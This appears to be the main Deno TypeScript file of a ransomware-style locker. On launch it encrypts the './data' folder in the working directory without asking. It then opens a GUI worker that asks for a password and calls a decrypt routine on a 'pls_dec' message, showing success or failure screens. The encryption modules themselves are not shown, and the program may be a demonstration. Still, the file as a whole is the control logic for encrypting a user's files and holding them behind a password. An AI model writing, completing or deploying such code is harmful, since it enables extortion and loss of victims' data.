import enc from './core/enc.ts'
import dec from './core/dec.ts'
import { preload } from 'webview'

import * as path from 'std/path/mod.ts'

await preload()


const targetPath = path.join(Deno.cwd(), './data')
await enc(targetPath)

const gui = new Worker(new URL("./gui_systems/main.ts", import.meta.url).href, { type: "module" })

gui.onmessage = async (evt) => {
  if (evt.data.type === 'pls_dec') {
    const result = await dec(targetPath, evt.data.password as string)
    
    if (result) {
      gui.terminate()
      new Worker(new URL("./gui_systems/ok.ts", import.meta.url).href, { type: "module" })
    } else {
      new Worker(new URL("./gui_systems/no_ok.ts", import.meta.url).href, { type: "module" })
    }
    return
  }
}
